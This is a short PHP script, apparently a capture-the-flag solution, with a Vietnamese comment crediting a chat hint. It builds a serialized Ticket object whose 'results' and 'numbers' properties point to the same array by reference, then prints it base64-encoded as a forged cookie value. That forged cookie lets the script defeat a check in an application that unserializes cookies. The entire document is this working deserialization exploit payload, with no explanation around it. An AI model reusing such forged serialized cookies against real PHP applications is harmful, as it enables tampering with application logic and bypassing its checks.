<?php
class Ticket{
    public $results;
    public $numbers;
}
# Sử dụng toán tử tham chiếu là cách tốt nhất tôi chợt nhớ lại nhờ chat hint =))
$ticket = new Ticket();
$arr = [];
$ticket->results = &$arr;
$ticket->numbers = &$arr;
$payload = base64_encode(serialize($ticket));
echo "Cookie ticket: " . $payload . "\n";